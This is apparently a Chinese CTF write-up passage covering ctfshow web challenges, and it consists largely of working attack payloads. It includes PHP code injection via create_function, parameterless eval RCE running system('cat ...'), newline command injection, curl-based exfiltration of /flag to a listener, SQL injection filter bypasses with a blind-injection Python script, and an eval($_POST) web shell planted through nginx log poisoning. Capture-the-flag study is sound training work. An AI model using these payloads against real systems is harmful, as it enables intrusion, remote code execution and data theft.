<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> create_function    ( <span class="keyword">string</span> <span class="variable">$args</span>   , <span class="keyword">string</span> <span class="variable">$code</span>   )</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$args</span> 变量部分</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$code</span> 方法代码部分</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">create_function(<span class="string">&#x27;$fname&#x27;</span>,<span class="string">&#x27;echo $fname.&quot;Zhang&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$fname</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fname</span>.<span class="string">&quot;Zhang&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">有问题的代码</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//02-8.php?id=2;&#125;phpinfo();/*</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="string">&#x27;echo  &#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="variable">$f1</span> = create_function(<span class="string">&#x27;$a&#x27;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">执行函数为：</span><br><span class="line">    <span class="comment">#源代码：</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>.<span class="variable">$a</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">   注入后代码：</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;&#125;</span><br><span class="line">          phpinfo();<span class="comment">/*;//此处为注入代码。</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br></pre></td></tr></table></figure>

<p>最终 payload 为 </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="attribute">action</span>=\create_function&amp;arg=1;&#125;print_r(scandir(<span class="string">&#x27;/&#x27;</span>));//</span><br><span class="line">?<span class="attribute">action</span>=\create_function&amp;arg=1;&#125;highlight_file(<span class="string">&#x27;/secret_you_never_know&#x27;</span>);//</span><br><span class="line">注释掉后面的;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web686"><a href="#web686" class="headerlink" title="web686"></a>web686</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220331202817135.png" alt="image-20220331202817135"></p>
<p>无参数rce</p>
<p>这串代码就是检查了我们通过GET方式传入的参数的值，代码会将$_GET[‘code’]中满足正则的部分，替换为空，然后查看是否剩下的部分强等于‘;’。如果满足，则执行eval。</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[^\W]</span>+\((?R)?\)</span><br><span class="line"> 首先是<span class="selector-attr">[^\W]</span></span><br><span class="line">对于\<span class="selector-tag">W</span>,其意思等价于<span class="selector-attr">[^A-Za-z0-9_]</span>。</span><br><span class="line">那么我们知道，我们的<span class="selector-tag">input</span>必须以此开头</span><br><span class="line">然后是括号匹配\( ...... \)</span><br><span class="line">(?R)?：意思为重复整个模式。但我们不能加参数,否则将无法匹配</span><br></pre></td></tr></table></figure>

<p>如果替换后的字符串只剩下 ; ,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，那么就会执行phpinfo()</p>
<p>因为代码中的正则表达式是循环执行的，所以我们也可以传入嵌套的无参函数。比如传入a(b(c()));，第一次匹配后，就剩a(b());，再匹配两次，就只剩下了 ; ，最后a(b(c()))就会被eval执行。</p>
<p>?code=eval(end(current(get_defined_vars())));&amp;get=system(‘cat /secret_you_never_know’);</p>
<p>get_defined_vars()：获取所有的已定义变量，返回值也是数组，二维数组；通过GET方式传入的参数会存在第一个数组中</p>
<p>current()，该函数可以返回数组中的单元且初始指针指向数组的第一个单元。因为GET方式传入的参数存在该二维数组中的第一个一维数组，所以我们可以通果这个函数将其取出来。一般我们的payload也是通过GET方式传入的，而我们要插入的恶意代码一般存在数组中的最后</p>
<p>end()：将数组内部指针指向最后一个单元并返回其值</p>
<h2 id="web687"><a href="#web687" class="headerlink" title="web687"></a>web687</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220331205843602.png" alt="image-20220331205843602"></p>
<p>先是一个一个函数，接受一个$_REQUEST类型的变量。</p>
<p>这里百度一下，知道这玩意是$_POST、$_GET二合一版本，get和post变量它都能接受。</p>
<p>下面代码就是将传入的ip参数中的所有管道符和一些特殊符号用‘’替换。</p>
<p>最后，将替换的参数加到‘ping -c 1’ 后面当做shell指令执行。</p>
<p>并且输出执行结果。</p>
<p>很明显是一道注入题，要想办法绕过检测。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="number">127.0.0.1</span>得到：PING <span class="number">127.0.0.1</span> (<span class="number">127.0.0.1</span>): <span class="number">56</span> data bytes</span><br><span class="line"></span><br><span class="line">%<span class="number">0</span>a 没过滤，代表 换行符号</span><br><span class="line"></span><br><span class="line">shell指令执行的时候就是两句：</span><br><span class="line"></span><br><span class="line">ping -c <span class="number">1 127.0.0</span>.<span class="number">1</span></span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">输入?ip=<span class="number">127.0.0.1</span>%<span class="number">0</span>als /</span><br><span class="line">有个文件夹flaaag</span><br><span class="line">?ip=<span class="number">127.0.0.1</span>%<span class="number">0</span>acat /flaaag</span><br><span class="line">ctfshow&#123;<span class="number">4</span>f021aa9-<span class="number">1459</span>-<span class="number">446</span>e-<span class="number">9</span>a68-be7<span class="number">50d456a61</span>&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web688"><a href="#web688" class="headerlink" title="web688"></a>web688</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220331211454709.png" alt="image-20220331211454709"></p>
<p>通过curl把文件内容带出去，我们正常情况下可以使用<code>curl url -F file=@/flag</code></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$url=escapeshellarg($url);</span><br><span class="line">$url=escapeshellcmd($url);</span><br><span class="line">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，</span><br><span class="line">这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 <span class="keyword">exec</span>(), <span class="keyword">system</span>() 执行运算符(反引号)</span><br><span class="line"></span><br><span class="line">escapeshellcmd — shell 元字符转义</span><br><span class="line">功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</span><br><span class="line">此函数保证用户输入的数据在传送到 <span class="keyword">exec</span>() 或 <span class="keyword">system</span>() 函数，或者 执行操作符 之前进行转义。</span><br><span class="line">反斜线（\）会在以下字符之前插入：</span><br><span class="line">&amp;<span class="comment">#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*。 *’ 和 “ 仅在不配对儿的时候被转义。</span></span><br><span class="line">在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</span><br><span class="line"></span><br><span class="line">escapeshellarg:将参数中的字符串两侧加上<span class="string">&#x27;,并将其中的&#x27;</span>进行转义 然后在两侧加上<span class="string">&#x27;达到拼接的目的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">escapeshellcmd:将参数中的字符串中间的特殊字符转义,并且将落单的&#x27;</span>进行转义</span><br><span class="line"></span><br><span class="line">这两个函数本意都是防止进行额外的命令执行,但是这两个函数连在一起使用就会出现问题: escapeshellarg()+escapeshellcmd() 之殇</span><br><span class="line"></span><br><span class="line">也就是说两个函数连续使用会造成<span class="string">&#x27;未被转义,从而触发命令执行</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> http://a<span class="number">6</span>d<span class="number">6</span>fb<span class="number">94</span>-<span class="number">08</span>a<span class="number">3</span>-<span class="number">4</span>e<span class="number">95</span>-afa<span class="number">7</span>-<span class="number">3</span>f<span class="number">340</span>fb<span class="number">46</span>b<span class="number">68</span>.challenge.ctf.show/&#x27; -F file=@/flag &#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; xxx -&gt;  &#x27;</span><span class="number">1</span><span class="string">&#x27;\&#x27;</span><span class="string">&#x27; xxx&#x27;</span> -&gt; <span class="string">&#x27;1&#x27;</span>\\<span class="string">&#x27;&#x27;</span> xxx\<span class="string">&#x27;</span></span><br><span class="line"><span class="string">具体内容可分为&#x27;</span><span class="number">1</span><span class="string">&#x27; \\ &#x27;</span><span class="string">&#x27; xxx \&#x27;</span>五部分</span><br><span class="line">两个反斜杠在一起就不再起到转义的作用了，也就是说我们可以逃出单引号。但是最后还多了个单引号，所以再写个就可以了，而其中的xxx就是我们要使用的内容</span><br><span class="line"><span class="built_in">curl</span> <span class="string">&#x27;url&#x27;</span> <span class="operator">-F</span> file=<span class="selector-tag">@</span>/flag</span><br><span class="line">payload:http://监听使用的ip:port/<span class="string">&#x27; -F file=@/flag&#x27;</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">4589</span>/<span class="string">&#x27; -F file=@/flag &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;http://127.0.0.1:4589/&#x27;</span>\<span class="string">&#x27;&#x27;</span> <span class="operator">-F</span> file=<span class="selector-tag">@</span>/flag \<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;http://127.0.0.1:4589/&#x27;</span>\\<span class="string">&#x27;&#x27;</span> <span class="operator">-F</span> file=<span class="selector-tag">@</span>/flag \\<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="web系列"><a href="#web系列" class="headerlink" title="web系列"></a>web系列</h2><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>万能密码登录成功：username=admin’ or 1=1#&amp;password=1</p>
<p>接下来为sql注入一系列操作（在username上操作）</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402202305918.png" alt="image-20220402202305918"></p>
<p>打开网站提示输入url，测试/etc/passwd成功显示，应为文件包含漏洞</p>
<p><strong>第一种方法：</strong><br> php伪协议中的data通过通配符查找目录下的所有文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> print_r(glob(&quot;*&quot;)); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>第二种方法：</strong></p>
<p>php input协议</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=php:<span class="regexp">//i</span>nput</span><br><span class="line">再在bp下post任意命令执行</span><br></pre></td></tr></table></figure>

<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>web3的方法不行了</p>
<p>日志包含<br>通过查看请求头可以知道服务器为nginx，nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log，其中access.log可以打开。<br>为了防止url编码，需要在burp中修改User-Agent为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接着菜刀或蚁剑连接。</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>考察<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020">md5</a>绕过，要求v1为为字母，v2为数字，并且v1与v2的md5值相同。</p>
<p>md5漏洞介绍：<br> PHP在处理<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%93%88%E5%B8%8C&spm=1001.2101.3001.7020">哈希</a>字符串时，它把每一个以“0E”开头的哈希值都解释为0<br> 所以只要v1与v2的md5值以0E开头即可。<br> v1=QNKCDZO&amp;v2=240610708</p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>1.尝试万能密码</p>
<pre><code>username=admin&#39; or 1=1#&amp;password=1
</code></pre>
<p>显示sql inject error，发现有字符被过滤。<br>逐个字符输入后发现过滤了空格，一般空格被过滤有如下替换方法<br>/**/<br>()<br>回车(url编码中的%0a)<br>`(tap键上面的按钮)<br>tap<br>两个空格</p>
<p>这里选择/**/</p>
<pre><code>username=admin&#39;/**/or/**/1=1#&amp;password=1
</code></pre>
<p>使用基本的sql注入模板获取flag</p>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402203012134.png" alt="image-20220402203012134"></p>
<p>首先判断注入点,输入以下payload,使SQL恒成立</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="regexp">/**/</span>and<span class="regexp">/**/</span><span class="number">1</span>=<span class="number">1</span></span><br><span class="line">?id=<span class="number">1</span><span class="regexp">/**/</span>and<span class="regexp">/**/</span><span class="number">1</span>=<span class="number">2</span></span><br><span class="line">过滤了空格</span><br></pre></td></tr></table></figure>

<p>由此可以判断页面存在SQL注入,注入点为<strong>数值型注入</strong>,页面中有显示位,可以尝试<strong>联合注入</strong>进行脱库</p>
<p>使用基本的sql注入模板获取flag</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?id=<span class="number">0</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span>#</span><br><span class="line">网站过滤了<span class="keyword">union</span> 常规注入是不行了，那么进行布尔型盲注。</span><br><span class="line"></span><br><span class="line">题目对逗号进行了过滤，那么也有绕过姿势！</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and ascii(substr((select database()),1,1))=xx #</span></span><br><span class="line"><span class="string">这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>())<span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))=xx #</span><br><span class="line">这是substr函数的两种用法</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://06eca5ec-5413-4f61-9072-d1a7ed12c667.challenge.ctf.show/index.php&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/&#123;0&#125;/**/for/**/1))=&#123;1&#125;#&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i), <span class="built_in">str</span>(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>index.phps,查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>$sql=”select * from user where username =’admin’ and password =’”.md5($password,true).”‘“;<br>对于函数md5(string,raw)<br>第二个参数有以下可选项：<br>TRUE - 原始 16 字符二进制格式<br>FALSE - 默认。32 字符十六进制数<br>所以只要md5加密后的16进制转化为二进制时有 ‘or’xxxx，即可构成闭合语句： username =’admin’ and password =‘ ’or ‘xxxxx’ 成功登陆<br>这里给出两个符合的字符串<br> ffifdyop<br> 129581926211651571912466741651878684928<br> 但题目有长度限制，所以输入ffifdyop即可获取flag</p>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>点击取消按钮，下载index.phps</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> preg_replace(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>)!=strlen(replaceSpecialChar(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>)!=strlen(replaceSpecialChar(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>出现了过滤</p>
<p>从源码中可以得知几乎把注入用到的关键词过滤的差不多了。<br>如果只有这一条现在可以采用双写绕过，但是下面这条限制，使得无法双写绕过</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="variable">$username</span>)!=<span class="built_in">strlen</span>(replaceSpecialChar(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			die(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>①group by（将结果集中的数据行根据选择列的值进行逻辑分组）<br>不加group by时的输出如下：<br><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402220314207.png" alt="image-20220402220314207"><br>在使用group by以后会按照password中的值进行排列：<br><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402220346449.png" alt="image-20220402220346449"><br>②with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）<br>来看实例：<br><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402220411202.png" alt="image-20220402220411202">结果中将会多出一行，其中password列为null，count（*)为统计和。<br>这里我们就可以通过骚姿势绕过了。<br>其中/**/是为了绕过空格过滤</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username=admin&#x27;<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">group</span><span class="comment">/**/</span>by<span class="comment">/**/</span>password<span class="comment">/**/</span><span class="keyword">with</span><span class="comment">/**/</span>rollup#&amp;password=</span><br></pre></td></tr></table></figure>

<p>因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可满足$password==$row[‘password’]的限制成功登陆。<br>登录成功即可显示flag。</p>
<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402221343218.png" alt="image-20220402221343218"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>password是由我们自己输入的，session中的password存储在本地，所以我们只需要输入空密码，并且将本地的session删除即可成功绕过。</p>
<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>查看网页源代码后发现：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hit:?cmd= --&gt;</span></span><br></pre></td></tr></table></figure>

<p>输入?cmd=phpinfo(); 有回显</p>
<p>猜测源码中应该为<code>eval($_GET[&#39;cmd&#39;]);</code></p>
<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402225225932.png" alt="image-20220402225225932"></p>
